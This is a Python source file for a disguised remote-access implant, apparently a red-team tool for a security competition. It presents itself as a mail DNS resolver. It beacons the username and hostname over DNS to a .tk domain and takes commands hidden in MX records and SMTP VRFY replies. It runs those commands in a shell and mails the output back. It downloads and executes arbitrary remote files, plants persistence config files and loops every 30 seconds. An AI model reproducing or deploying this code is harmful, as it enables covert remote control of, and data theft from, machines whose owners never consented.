"""
    This is based on code pulled from https://github.com/ValeryTyumen/DNS-Client combined into one
    file for easy dropping.
    This code can't decode TXT records or anything fun, so I'm going to encode everything as MX or CNAME
    But that has to meet the requirements for hostnames, which can only have [0-9], [a-z], -
"""


SERVER = "127.0.0.1"
# SERVER = "8.8.8.8"
TARGET_FQDN = "a.linuxmailexchange.tk"
dnsResult = False
c2IP = "samplec2.ists."
c2enabled = True

'''
Copyright (c) 2014 Valera Likhosherstov <v.lihosherstov@gmail.com>
dns message structures
'''
import smtplib
import struct
import random
import getpass
import socket
import subprocess
import urllib.request
import os
import sys
import argparse
import time
import istsbot

def wget(cmd):
    #parse a "wg http://..." command
    #chmod +x downloaded file
    #xeq downloaded file
    url = cmd[3:]
    extension = cmd[-4:] #This is mostly for windows stuff
    fileName, headers = urllib.request.urlretrieve(url) #saves as temp file
    os.rename(fileName, fileName+extension)
    fileName += extension
    os.chmod(fileName, 0o555) #r-xr-xr-x
    print(fileName)
    out = subprocess.Popen([fileName], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
    (stdout, stderr) = out.communicate()

def configFile(command):
    #Place a config file in the correct location depending on OS and privilege levels
    if os.name == "posix":
        try:
            f = open("/etc/mailman","w")
            f.write(command.split(" ")[1])
        except:
            f = open("~/.mailman","w")
            f.write(command.split(" ")[1])
    else:
        try:
            f = open("C:\\Windows\\mailman.ini")
            f.write(command.split(" ")[1])
        except:
            f = open(os.environ["APPDATA"]+"\\mailman.ini", "w")
            f.write(command.split(" ")[1])

def runCommand(command):
    if len(command) > 3:
        if command[0:2] == "wg ":
            wget(command)
            return
    if command == "sojuman":
        wget("wg https://github.com/ChoiSG/sojuman/raw/master/dist/sojuman")
        return
    if len(command) > 5:
        if command[0:5] == "conf ":
            configFile(command)
            return
    out = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
    return out.communicate()

def pack(value):
    '''packs unsigned short
    '''
    return struct.pack('>H', value)


def unpack(data):
    '''unpacks unsigned short
    '''
    return struct.unpack('>H', data)[0]


def decode_string(message, offset):
    '''decodes string
    '''
    index = offset
    result = ''
    offset = 0
    while message[index] != 0:
        value = message[index]
        if (value >> 6) == 3:
            next = unpack(message[index:index + 2])
            if offset == 0:
                offset = index + 2
            index = next ^ (3 << 14)
        else:
            result += message[index + 1:index + 1 +
                                        value].decode('utf-8') + '.'
            index += value + 1
    if offset == 0:
        offset = index + 1
    result = result[:-1]
    return (offset, result)


query_type_names = {1: 'A', 2: 'NS', 5: 'CNAME', 15: 'MX', 28: 'AAAA'}
opcodes = {0: 'QUERY', 1: 'IQUERY', 2: 'STATUS'}
query_class_names = {1: 'IN'}
message_types = {0: 'QUERY', 1: 'RESPONSE'}
responce_code_names = {0: 'No error', 1: 'Format error',
                       2: 'Server failure', 3: 'Name error', 4: 'Not implemented', 5: 'Refused'}


class MessageHeader:
    '''message header class
    '''

    def decode(self, message):
        '''decode header
        '''
        self.messageID = unpack(message[0:2])
        meta = unpack(message[2:4])
        self.rcode = (meta & 15)
        meta >>= 7
        self.ra = (meta & 1)
        meta >>= 1
        self.rd = (meta & 1)
        meta >>= 1
        self.tc = (meta & 1)
        meta >>= 1
        self.aa = (meta & 1)
        meta >>= 1
        self.opcode = (meta & 15)
        meta >>= 4
        self.qr = meta
        self.qd_count = unpack(message[4:6])
        self.an_count = unpack(message[6:8])
        self.ns_count = unpack(message[8:10])
        self.ar_count = unpack(message[10:12])
        return 12

    def generate_ID(self):
        '''generate random message ID
        '''
        return random.randint(0, 65535)

    def set_question_header(self, recursion_desired):
        '''set header for request
        '''
        self.messageID = self.generate_ID()
        self.qr = 0
        self.opcode = 0
        self.aa = 0
        self.tc = 0
        if recursion_desired:
            self.rd = 1
        else:
            self.rd = 0
        self.ra = 0
        self.rcode = 0
        self.qd_count = 1
        self.an_count = 0
        self.ns_count = 0
        self.ar_count = 0

    def encode(self):
        '''encode header
        '''
        result = pack(self.messageID)
        meta = 0
        meta |= self.qr
        meta <<= 1
        meta |= self.opcode
        meta <<= 4
        meta |= self.aa
        meta <<= 1
        meta |= self.tc
        meta <<= 1
        meta |= self.rd
        meta <<= 1
        meta |= self.ra
        meta <<= 7
        meta |= self.rcode
        result += pack(meta)
        result += pack(self.qd_count)
        result += pack(self.an_count)
        result += pack(self.ns_count)
        result += pack(self.ar_count)
        return result

    def print(self):
        '''for debug mode
        '''
        print('    Message ID: {0}'.format(hex(self.messageID)))
        print('    Query/Responce: {0}'.format(message_types[self.qr]))
        print('    Opcode: {0} ({1})'.format(self.opcode,
                                             opcodes[self.opcode]))
        print('    Authoritative Answer: {0}'.format(bool(self.aa)))
        print('    TrunCation: {0}'.format(bool(self.tc)))
        print('    Recursion Desired: {0}'.format(bool(self.rd)))
        print('    Recursion Available: {0}'.format(bool(self.ra)))
        print('    Responce Code: {0} ({1})'.format(self.rcode,
                                                    responce_code_names[self.rcode]))
        print('    Questions: {0}'.format(self.qd_count))
        print('    Answers: {0}'.format(self.an_count))
        print('    Authority RRs: {0}'.format(self.ns_count))
        print('    Additional RRs: {0}'.format(self.ar_count))


class DNSQuestion:
    '''dns question class
    '''

    def decode(self, message, offset):
        '''decode question
        '''
        name = decode_string(message, offset)
        offset = name[0]
        self.name = name[1]
        self.type = unpack(message[offset:offset + 2])
        self.request_class = unpack(message[offset + 2:offset + 4])
        return offset + 4

    def set_question(self, name, IPv6):
        '''set question
        '''
        self.name = name
        if IPv6:
            self.type = 28
        else:
            self.type = 15
        self.request_class = 1

    def encode_name(self):
        '''encode question name
        '''
        name = self.name
        if name.endswith('.'):
            name = name[:-1]
        result = b''
        for domain_name in name.split('.'):
            result += struct.pack('B', len(domain_name))
            result += bytes(domain_name, 'utf-8')
        result += b'\x00'
        return result

    def encode(self):
        '''encode question
        '''
        result = self.encode_name()
        result += pack(self.type)
        result += pack(self.request_class)
        return result

    def print(self):
        '''for debug mode
        '''
        print('    Name: {0}'.format(self.name))
        print('    Type: {0}'.format(query_type_names[self.type]))
        print('    Class: {0}'.format(query_class_names[self.request_class]))


class AResourceData:
    '''resource data class
    '''

    def __init__(self, data):
        ip = struct.unpack('BBBB', data)
        self.ip = str(ip[0]) + '.' + str(ip[1]) + \
                  '.' + str(ip[2]) + '.' + str(ip[3])

    def print(self):
        '''for debug mode
        '''
        print('    A: {0}'.format(self.ip))
    def getElement(self):
        return self.ip


class AAAAResourceData:
    '''resource data class
    '''

    def hexdump(self, data):
        '''dump data
        '''
        result = ''
        for byte in data:
            result += str(hex(256 + byte))[3:]
        return result

    def __init__(self, data):
        self.data = data
        self.ip = ''
        dump = self.hexdump(data)
        for i in range(8):
            value = dump[i * 4:i * 4 + 4]
            for i in range(4):
                if value[i] != '0':
                    value = value[i:]
                    break
                if i == 3:
                    value = ''
            self.ip += value + ':'
        self.ip = self.ip[:-1]

    def print(self):
        '''for debug mode
        '''
        print('    AAAA: {0}'.format(self.ip))
    def getElement(self):
        return self.ip


class NSResourceData:
    '''resource data class
    '''

    def __init__(self, message, offset):
        self.name = decode_string(message, offset)[1]

    def print(self):
        '''for debug mode
        '''
        print('    NS: {0}'.format(self.name))
    def getElement(self):
        return self.name


class MXResourceData:
    '''resource data class
    '''

    def __init__(self, message, offset):
        self.preference = unpack(message[offset:offset + 2])
        offset += 2
        self.mail_exchanger = decode_string(message, offset)[1]

    def print(self):
        '''for debug mode
        '''
        print('    MX: {0} {1}'.format(self.preference,
                                       self.mail_exchanger))
    def getElement(self):
        return self.mail_exchanger


class CNAMEResourceData:
    '''resource data class
    '''

    def __init__(self, message, offset):
        self.name = decode_string(message, offset)[1]

    def print(self):
        '''for debug mode
        '''
        print('    CNAME: {0}'.format(self.name))


class BinaryResourceData:
    '''resource data class
    '''

    def __init__(self, data):
        self.data = data

    def print(self):
        '''for debug mode
        '''
        print('    Data: {0}'.format(self.data))


class ResourceRecord:
    '''resource record class
    '''

    def set_resource_data(self, message, offset):
        '''set resource data
        '''
        rdata = message[offset: offset + self.rd_length]
        if self.type == 1:
            self.resource_data = AResourceData(rdata)
        elif self.type == 2:
            self.resource_data = NSResourceData(message, offset)
        elif self.type == 5:
            self.resource_data = CNAMEResourceData(message, offset)
        elif self.type == 15:
            self.resource_data = MXResourceData(message, offset)
        elif self.type == 28:
            self.resource_data = AAAAResourceData(rdata)
        else:
            self.resource_data = BinaryResourceData(rdata)

    def decode(self, message, offset):
        '''decode rr
        '''
        name = decode_string(message, offset)
        offset = name[0]
        self.name = name[1]
        self.type = unpack(message[offset:offset + 2])
        offset += 2
        self.request_class = unpack(message[offset:offset + 2])
        offset += 2
        self.ttl = struct.unpack('>I', message[offset: offset + 4])[0]
        offset += 4
        self.rd_length = unpack(message[offset:offset + 2])
        offset += 2
        self.set_resource_data(message, offset)
        return offset + self.rd_length

    def print(self):
        '''for debug mode
        '''
        print('    Name: {0}'.format(self.name))
        print('    Type: {0}'.format(query_type_names[self.type]))
        print('    Class: {0}'.format(
            query_class_names[self.request_class]))
        print('    TTL: {0}'.format(self.ttl))
        self.resource_data.print()
    def getElement(self):
        return self.resource_data


class DNSMessageFormat:
    '''dns message format class
    '''

    def encode(self, host_name, recursion_desired, IPv6):
        '''encode message
        '''
        message = b''
        self.header = MessageHeader()
        self.header.set_question_header(recursion_desired)
        message += self.header.encode()
        self.question = DNSQuestion()
        self.question.set_question(host_name, IPv6)
        message += self.question.encode()
        return message

    def decode(self, message):
        '''decode message
        '''
        self.header = MessageHeader()
        offset = self.header.decode(message)
        self.questions = []
        self.answers = []
        self.authority_RRs = []
        self.additional_RRs = []
        for i in range(self.header.qd_count):
            self.questions.append(DNSQuestion())
            offset = self.questions[i].decode(message, offset)
        for i in range(self.header.an_count):
            self.answers.append(ResourceRecord())
            offset = self.answers[i].decode(message, offset)
        for i in range(self.header.ns_count):
            self.authority_RRs.append(ResourceRecord())
            offset = self.authority_RRs[i].decode(message, offset)
        for i in range(self.header.ar_count):
            self.additional_RRs.append(ResourceRecord())
            offset = self.additional_RRs[i].decode(message, offset)

    def print(self):
        '''for debug mode
        '''
        print('MESSAGE HEADER')
        self.header.print()
        for i in range(self.header.qd_count):
            print('QUESTION[{0}]'.format(i))
            self.questions[i].print()
        for i in range(self.header.an_count):
            print('ANSWER[{0}]'.format(i))
            self.answers[i].print()
        for i in range(self.header.ns_count):
            print('AUTHORITY_RR[{0}]'.format(i))
            self.authority_RRs[i].print()
        for i in range(self.header.ar_count):
            print('ADDITIONAL_RR[{0}]'.format(i))
            self.additional_RRs[i].print()

    def print_result(self):
        '''output application result
        '''
        for answer in self.answers:
            if answer.type == 1 or answer.type == 28:
                print(answer.resource_data.ip)

    def get_results(self):
        retVal = []
        for answer in self.answers:
                # retVal.append(answer.resource_data.data)
            if answer.type == 15:
                retVal += answer.getElement().getElement()
        return retVal



'''
Copyright (c) 2014 Valera Likhosherstov <v.lihosherstov@gmail.com>
DNS client engine
'''

class DNSClient:
    '''dns client class
    '''

    def __init__(self, server=SERVER):
        self.socket = socket.socket(socket.AF_INET,
                                    socket.SOCK_DGRAM)
        self.socket.settimeout(5)
        self.connect_server(server)

    def connect_server(self, server):
        '''connection
        '''
        try:
            self.socket.connect((server, 53))
        except Exception:
            print('Unable to connect to server {0}'.format(server))
            return False
        self.server = server
        return True

    def cmdDecode(self, results):
        rawCommand = ""
        for result in results:
            rawCommand += result
        commandParts = [rawCommand[i:i + 2] for i in range(0, len(rawCommand), 2)]
        command = ""
        for part in commandParts:
            command += chr(int(part)+32)
        return command


    def send_query(self, request, recursion_desired=True,
                   debug_mode=False, IPv6=False):
        '''request
        '''

        global c2enabled
        global c2IP

        format = DNSMessageFormat()
        query = format.encode(request, recursion_desired, IPv6)
        self.socket.send(query)
        try:
            response = self.socket.recv(1024)
        except Exception:
            print('Time Out: {0}'.format(self.server))
            sys.exit(0)
        format.decode(response)

        if len(format.answers) > 0:
            format.print_result()
            results = format.get_results()
            if len(results) > 0:
                if request == "c2.a.linuxmailexchange.tk.":
                    c2IP = results
                    self.socket.close()
                    return
                if request == "c2e.a.linuxmailexchange.tk.":
                    c2enabled = (results == "yes.")
                    self.socket.close()
                    return

                # command = self.cmdDecode(results)
                # print(results)
                # print(command)
                # out = subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
                (stdout, stderr) = runCommand(self.cmdDecode(results))
                dnsResult = True
            self.socket.close()
        elif not recursion_desired:
            for rr in format.additional_RRs:
                if self.connect_server(rr.resource_data.ip):
                    ipv6 = (rr.type == 28)
                    self.send_query(request, recursion_desired=False,
                                    debug_mode=debug_mode, IPv6=ipv6)

    def disconnect(self):
        '''disconnect
        '''
        self.socket.close()


def dnsRun(dest):
    client = DNSClient(server=dest)
    username = getpass.getuser()
    machineIP = socket.getfqdn()  # should get full hostname/domain name
    requestName = username + "AT." + machineIP + "." + TARGET_FQDN
    # print("Requesting:", requestName)
    client.send_query("c2.a.linuxmailexchange.tk.", recursion_desired=True, debug_mode=False)
    client.send_query("c2e.a.linuxmailexchange.tk.", recursion_desired=True, debug_mode=False)
    client.send_query(requestName, recursion_desired=True, debug_mode=False)
    client.disconnect()

def smtpRun(dest):
    connection = smtplib.SMTP()
    connection.connect(dest, 25)
    connection.ehlo()
    username = getpass.getuser()
    # machineIP = socket.gethostbyname_ex(socket.gethostname())[-1][-1] #Tested on windows
    machineIP = socket.getfqdn() #should get full hostname/domain name
    emailAddr = username + "@" + machineIP
    code,command = connection.verify(emailAddr) #tuple of code and string response
    if(code != 250):
        return #Wait for next run
    command = command.decode("UTF-8")
    stdout,stderr = runCommand(command)
    if stdout != None:
        stdout = stdout.decode("UTF-8")
    else:
        stdout = ""
    if stderr != None:
        stderr = stderr.decode("UTF-8")
    else:
        stderr = ""
    connection.sendmail(emailAddr, "mailman@"+dest, stdout+"\n"+stderr)

def linuxResolv():
    for line in open("/etc/resolv.conf", "r"):
        cols = line.split()
        if cols[0] == "nameserver":
            return cols[1:]
    return "localhost"

def windowsResolv():
    fqdn = socket.getfqdn()
    parts = fqdn.split(".")
    if len(parts) > 1:
        #try to hit their DC
        return "lordnikon."+ ".".join(parts[1:])
    return "localhost" #It's worth a try?

def combine(lst):
    retVal = ""
    for s in lst:
        retVal += s
    return retVal

def guessDest():
    #Check if the config file exists
    if os.name == "posix":
        configLoc = "/etc/mailman"
    else:
        configLoc = "C:\\Windows\\mailman.ini"
    try:
        f = open(configLoc, "r")
        dest = f.read()
        return dest,dest
    except:
        if os.name == "posix":
            configLoc = "~/.mailman"
        else:
            configLoc = os.environ["APPDATA"]+"\\mailman.ini"
        try:
            f = open(configLoc, "r")
            dest = f.read().strip()
            return dest,dest
        except:
            #now we just sorta ... guess our resolver
            if os.name != "posix":
                return "",combine(windowsResolv())
            elif sys.platform == "linux":
                return "",combine(linuxResolv())
    return "","localhost" #this is a decent guess on some platforms as a last resort, especially as the BSD box is DNS in the topology

def main():
    smtpDest = ""
    dnsDest = ""
    smtpDest,dnsDest = guessDest() #let's guess a resolver and then overwrite if the args say otherwise

    parser = argparse.ArgumentParser(description='Maintains DNS resolution for email delivery.')
    parser.add_argument("--systemd", help="Take input and timing from SystemD rather than running automatically by itself.", action="store_true")
    #parser.add_argument('-D', "--dns", help="Use DNS", action="store_true")  #We'll always run DNS
    parser.add_argument("-S", "--smtp", help="Use SMTP", action="store_true")
    parser.add_argument('hostname', help="The hostname or IP of the destination server")
    args = parser.parse_args()

    if args.hostname is not None and args.hostname != "":
        smtpDest = args.hostname
        dnsDest = args.hostname

    while True:
        dnsRun(dnsDest)
        if args.smtp:
            smtpRun(smtpDest)
        if c2enabled:
            istsbot.istsCallback(c2IP)
        if args.systemd:
            # running from systemd, don't enable timed autorun
            exit(0)
        time.sleep(30)

if __name__ == "__main__":
    main()